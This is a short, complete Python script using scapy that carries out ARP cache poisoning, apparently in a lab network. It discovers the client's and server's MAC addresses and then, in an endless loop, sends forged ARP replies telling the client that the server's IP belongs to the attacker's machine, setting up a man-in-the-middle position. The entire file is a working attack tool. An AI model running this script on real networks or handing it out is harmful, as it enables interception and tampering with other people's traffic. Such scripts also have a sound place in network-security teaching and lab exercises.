#!/usr/bin/env python3
# arp_poison_client.py -- sends ARP replies to the client telling it that
# 10.0.0.3 is at our MAC (we only poison the client)
from scapy.all import ARP, sendp, Ether, srp, get_if_hwaddr, conf
import time

iface = "eth0"                 # change if needed
conf.iface = iface

# discover MACs of client and server via ARP who-has
ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.0.0.2"), timeout=2, iface=iface, verbose=False)
if not ans:
    raise SystemExit("No answer for 10.0.0.2 (client)")
client_mac = ans[0][1][ARP].hwsrc

ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.0.0.3"), timeout=2, iface=iface, verbose=False)
if not ans:
    raise SystemExit("No answer for 10.0.0.3 (server)")
server_mac = ans[0][1][ARP].hwsrc

print(f"client_mac: {client_mac} | server_mac: {server_mac}")

# use the actual MAC of the interface (safer than hardcoding)
my_mac = get_if_hwaddr(iface)
print(f"our MAC: {my_mac} (iface {iface})")

# Build a link-layer ARP reply telling the client that 10.0.0.3 is at our MAC
pkt = Ether(src=my_mac, dst=client_mac) / ARP(op=2,
                                              psrc="10.0.0.3", hwsrc=my_mac,
                                              pdst="10.0.0.2", hwdst=client_mac)

try:
    print("Beginning poison loop (CTRL-C to stop)")
    while True:
        # sendp sends at layer 2 and honors iface
        sendp(pkt, iface=iface, verbose=False, count=1)
#        print("send one..")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nstopped")

